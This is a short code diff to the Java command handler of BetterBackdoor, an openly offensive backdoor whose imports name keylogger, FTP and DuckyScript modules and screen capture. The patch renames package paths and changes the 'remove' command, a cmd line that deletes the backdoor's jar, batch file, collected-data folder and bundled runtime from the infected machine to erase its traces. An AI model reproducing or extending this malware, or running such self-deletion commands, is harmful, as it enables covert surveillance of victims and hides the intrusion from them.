@@ -1,4 +1,4 @@
-package com.thatcherdev.betterbackdoor.backdoor;
+package dev.thatcherclough.betterbackdoor.backdoor;
 
 import java.awt.Rectangle;
 import java.awt.Robot;
@@ -13,10 +13,10 @@ import java.util.Scanner;
 
 import javax.imageio.ImageIO;
 
-import com.thatcherdev.betterbackdoor.backend.DuckyScripts;
-import com.thatcherdev.betterbackdoor.backend.FTP;
-import com.thatcherdev.betterbackdoor.backend.KeyLogger;
-import com.thatcherdev.betterbackdoor.backend.Utils;
+import dev.thatcherclough.betterbackdoor.backend.DuckyScripts;
+import dev.thatcherclough.betterbackdoor.backend.FTP;
+import dev.thatcherclough.betterbackdoor.backend.KeyLogger;
+import dev.thatcherclough.betterbackdoor.backend.Utils;
 
 import org.apache.commons.io.FileUtils;
 
@@ -229,7 +229,7 @@ public class HandleCommand {
 			}
 		else if (command.equals("remove"))
 			try {
-				Runtime.getRuntime().exec("cmd /c ping localhost -n 5 > nul && del /f /q run.jar run.bat && rd /s /q "
+				Runtime.getRuntime().exec("cmd /c ping localhost -n 5 > nul && cd "+System.getProperty("user.dir")+" && del /f /q run.jar run.bat && rd /s /q "
 						+ Backdoor.gatheredDir + " jre");
 				System.exit(0);
 			} catch (Exception e) {
